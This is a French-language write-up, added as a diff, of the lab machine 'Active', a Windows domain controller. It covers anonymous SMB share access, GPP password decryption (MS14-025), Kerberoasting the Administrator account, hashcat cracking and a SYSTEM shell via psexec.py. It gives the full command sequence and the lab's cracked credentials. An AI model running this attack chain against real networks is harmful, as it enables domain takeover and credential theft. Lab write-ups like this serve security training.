@@ -1,0 +1,244 @@
+---
+title: Active
+description: WU Active
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 2
+  badge:
+    text: 'easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**EASY**</span> | 10.129.7.157 |
+
+## Flags
+
+| Flag | Emplacement |
+|------|-------------|
+| User | `C:\Users\SVC_TGS\Desktop\user.txt` |
+| Root | `C:\Users\Administrator\Desktop\root.txt` |
+
+## Résumé
+
+1. **Énumération SMB anonyme** : Accès au partage Replication
+2. **Group Policy Preferences** : Décryptage du mot de passe AES (MS14-025)
+3. **Kerberoasting** : Attaque contre le SPN de l'Administrator
+4. **Crackage de dictionnaire** : Obtention des credentials Administrator
+5. **Accès système** : Shell SYSTEM via PsExec
+
+---
+
+## Configuration et Reconnaissance
+
+### Configuration de l'Environnement
+
+```bash
+export TARGET=10.129.7.157
+export DOMAIN=active.htb
+echo "$TARGET active.htb DC.active.htb" >> /etc/hosts
+```
+
+### Scan Nmap
+
+```bash
+nmap -p- $TARGET -sV -sC -oN nmap_full.txt
+```
+
+**Ports Critiques Identifiés :**
+
+| Port | Service | Signification |
+|------|---------|--------------|
+| 53 | DNS | Tentatives de transfert de zone |
+| 88 | Kerberos | Vecteurs AS-REP/Kerberoasting |
+| 389 | LDAP | Énumération anonyme |
+| 445 | SMB | Accès aux partages - vecteur principal |
+| 636 | LDAPS | LDAP chiffré |
+| 3268 | Global Catalog | Énumération LDAP étendue |
+
+**Observation Clé :** Signature SMB requise, éliminant les attaques directes de relay NTLM.
+
+## Énumération SMB Anonyme
+
+### Découverte des Partages
+
+```bash
+smbclient -L //$TARGET -N
+smbmap -H $TARGET -u '' -p ''
+```
+
+**Résultat :** Accès anonyme accordé au partage `Replication` avec accès READ.
+
+### Extraction du Contenu des Partages
+
+```bash
+smbclient //$TARGET/Replication -N -c 'recurse ON; prompt OFF; mget *'
+find . -type f
+```
+
+**Fichiers Clés Localisés :**
+```
+./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/
+  MACHINE/Preferences/Groups/Groups.xml
+  MACHINE/Registry.pol
+  MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+```
+
+## Décryptage du Mot de Passe GPP (MS14-025)
+
+### Contexte de la Vulnérabilité
+
+Les Group Policy Preferences permettaient aux administrateurs de configurer des comptes et services via des templates GPO, avec des mots de passe chiffrés en AES-256 et une clé publiquement divulguée.
+
+### Analyse de Groups.xml
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+        name="active.htb\\SVC_TGS"
+        image="2"
+        changed="2018-07-18 20:46:06"
+        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
+    <Properties action="U"
+                newName=""
+                fullName=""
+                description=""
+                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+                changeLogon="0"
+                noChange="1"
+                neverExpires="1"
+                acctDisabled="0"
+                userName="active.htb\\SVC_TGS"/>
+  </User>
+</Groups>
+```
+
+### Décryptage
+
+```bash
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
+**Output :** `GPPstillStandingStrong2k18`
+
+### Credentials Obtenus
+
+```
+SVC_TGS:GPPstillStandingStrong2k18
+```
+
+```bash
+export USER=SVC_TGS
+export PASS=GPPstillStandingStrong2k18
+```
+
+## Attaque Kerberoasting
+
+### Découverte des SPN
+
+```bash
+GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $TARGET -outputfile kerb.hash
+```
+
+**Résultat :**
+```
+ServicePrincipalName  Name              MemberOf
+active/CIFS:445       Administrator     CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
+```
+
+### Explication de l'Attaque
+
+Quand un compte authentifié du domaine demande un ticket de service, le KDC fournit un TGS chiffré avec le hash NTLM du compte de service cible, sans vérifier les droits d'accès réels. Ce ticket exportable peut être cracké hors ligne.
+
+La mauvaise configuration critique : Le nom principal de service était directement associé au compte Administrator plutôt qu'à un compte de service dédié.
+
+### Crackage du Hash
+
+```bash
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+```
+
+**Mode 13100 :** Kerberos 5 TGS-REP etype 23 (RC4)
+
+**Output :**
+```
+$krb5tgs$23$*Administrator$ACTIVE.HTB$...:Ticketmaster1968
+Status: Cracked
+Time: 5 secs
+```
+
+### Credentials Obtenus
+
+```
+Administrator:Ticketmaster1968
+```
+
+## Accès Système et Escalade de Privilèges
+
+### Exploitation PsExec
+
+```bash
+psexec.py active.htb/Administrator:Ticketmaster1968@$TARGET
+```
+
+**Mécanisme :** L'outil se connecte via SMB, télécharge un binaire de service exécutable vers ADMIN$, l'enregistre et le démarre comme service Windows, puis établit un named pipe pour l'exécution de commandes en contexte SYSTEM.
+
+**Output :**
+```
+Microsoft Windows [Version 6.1.7601]
+C:\Windows\system32>
+```
+
+### Récupération des Flags
+
+```cmd
+type C:\Users\SVC_TGS\Desktop\user.txt
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+## Séquence de Commandes Complète
+
+```bash
+# Setup
+export TARGET=10.129.7.157
+export DOMAIN=active.htb
+echo "$TARGET active.htb DC.active.htb" >> /etc/hosts
+
+# Énumération
+smbclient -L //$TARGET -N
+smbmap -H $TARGET -u '' -p ''
+smbclient //$TARGET/Replication -N -c 'recurse ON; prompt OFF; mget *'
+
+# Décryptage GPP
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+export USER=SVC_TGS PASS=GPPstillStandingStrong2k18
+
+# Kerberoasting
+GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $TARGET -outputfile kerb.hash
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+
+# Accès Système
+psexec.py active.htb/Administrator:Ticketmaster1968@$TARGET
+```
+
+## Résumé des Outils et Techniques
+
+| Outil | Usage |
+|------|--------|
+| smbclient | Énumération de partages SMB et transfert de fichiers |
+| smbmap | Cartographie des permissions sur les partages |
+| gpp-decrypt | Décryptage AES des Group Policy Preferences |
+| GetUserSPNs.py | Énumération Kerberos SPN et extraction TGS |
+| hashcat | Crackage de hash NTLM par dictionnaire |
+| psexec.py | Exécution de commandes distantes en SYSTEM |
+
+## Vulnérabilités Clés Exploitées
+
+1. **MS14-025 :** Clés de chiffrement publiquement divulguées pour les mots de passe GPP
+2. **Kerberoasting :** Mot de passe faible sur le SPN du domaine (compte Administrator)
+3. **Permissions Excessives :** Compte de service avec droits de modification SPN
+4. **Politique de Mot de Passe Faible :** Credentials crackables par dictionnaire
